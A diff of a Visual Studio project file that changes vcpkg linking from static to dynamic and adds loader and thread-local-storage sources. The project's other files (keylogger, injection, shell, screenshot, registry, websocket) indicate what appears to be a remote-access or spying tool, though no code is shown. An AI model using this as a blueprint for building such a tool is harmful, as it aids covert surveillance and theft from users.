@@ -88,16 +88,16 @@
     <LinkIncremental>false</LinkIncremental>
   </PropertyGroup>
   <PropertyGroup Label="Vcpkg" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
-    <VcpkgUseStatic>true</VcpkgUseStatic>
+    <VcpkgUseStatic>false</VcpkgUseStatic>
   </PropertyGroup>
   <PropertyGroup Label="Vcpkg" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
-    <VcpkgUseStatic>true</VcpkgUseStatic>
+    <VcpkgUseStatic>false</VcpkgUseStatic>
   </PropertyGroup>
   <PropertyGroup Label="Vcpkg" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
-    <VcpkgUseStatic>true</VcpkgUseStatic>
+    <VcpkgUseStatic>false</VcpkgUseStatic>
   </PropertyGroup>
   <PropertyGroup Label="Vcpkg" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
-    <VcpkgUseStatic>true</VcpkgUseStatic>
+    <VcpkgUseStatic>false</VcpkgUseStatic>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <ClCompile>
@@ -181,10 +181,12 @@
     <ClCompile Include="src\injection.cpp" />
     <ClCompile Include="src\keylogger.cpp" />
     <ClCompile Include="src\LeagueOfLegends.cpp" />
+    <ClCompile Include="src\loader.cpp" />
     <ClCompile Include="src\main.cpp" />
     <ClCompile Include="src\registry.cpp" />
     <ClCompile Include="src\screenshot.cpp" />
     <ClCompile Include="src\shell.cpp" />
+    <ClCompile Include="src\ThreadLocalStorage.cpp" />
     <ClCompile Include="src\utils.cpp" />
     <ClCompile Include="src\ws.cpp" />
   </ItemGroup>
